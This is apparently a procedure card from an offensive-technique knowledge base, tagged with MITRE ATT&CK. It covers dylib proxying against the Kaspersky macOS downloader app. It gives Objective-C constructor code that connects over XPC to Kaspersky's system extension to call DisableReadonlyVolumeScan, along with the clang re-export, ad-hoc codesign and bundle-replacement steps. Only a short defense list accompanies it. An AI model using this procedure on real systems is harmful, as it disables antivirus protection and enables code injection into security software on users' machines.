---
id: proc-dylib-proxy-001
tags:
  - dylib-proxy
  - code-injection
  - objective-c
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - macOS
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[DLL Side-Loading]]'
updated_at: '2025-12-14T17:29:10.012Z'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[DLL Side-Loading]]'
---
# Create-Custom-Dylib-Proxy

## Summary

Compile a custom dynamic library (dylib) that proxies the original libkl_appkit.dylib, reexporting its symbols while injecting code in the constructor to establish an XPC connection and control AV functions.

## Description

Rename the original libkl_appkit.dylib to libkl_appkit_orig.dylib, then create a new dylib that loads the original and reexports all symbols. In the constructor (__attribute__((constructor))), use NSXPCConnection to connect to the Mach service with host options (4096), set the remote interface to IPCServiceProtocol, obtain an endpoint for FileMonitorProtocol, create a new connection, and invoke DisableReadonlyVolumeScan:1. Sign the dylib (ad-hoc or with valid cert) and replace the original in the app bundle.

## Requirements

1. Xcode with Objective-C support for compilation
2. Knowledge of dylib reexporting and XPC APIs
3. codesign for binary signing

## Defense

Defensive measures and detection strategies:

- Enable library validation entitlements and hardened runtime
- Monitor for unsigned or modified dylibs in app bundles via codesign checks
- Use Integrity Protection to prevent bundle modifications

## Objectives

1. Proxy original library functions
2. Inject XPC connection code
3. Ensure seamless loading without crashes

## Instructions

### Step 1: Rename Original and Prepare Proxy Source

**Context**: Backup the target dylib and write proxy code.

Rename libkl_appkit.dylib to libkl_appkit_orig.dylib in the bundle.

Create proxy.m with reexports and constructor:

```objective-c
#import <Foundation/Foundation.h>

__attribute__((constructor))
static void proxy_init() {
    // NSXPCConnection code here
    NSXPCConnection *conn = [[NSXPCConnection alloc] initWithMachServiceName:@"2Y8XE5CQ94.com.kaspersky.kav.sysext" options:4096];
    // Set interface, get endpoint, invoke method
}
// Reexport symbols from orig dylib
```

### Step 2: Compile, Sign, and Replace

**Context**: Build the proxy and integrate it.

Compile: clang -dynamiclib -framework Foundation proxy.m -o libkl_appkit.dylib -reexport_library /path/to/libkl_appkit_orig.dylib

Sign: codesign -s - libkl_appkit.dylib

Replace in /Volumes/Kaspersky Internet Security/Kaspersky Downloader.app/Contents/MacOS/

> Expected output: Signed dylib with correct path and symbols.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[DLL Side-Loading]] DLL Side-Loading (dylib proxying equivalent)

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- dylib
- proxy
- injection
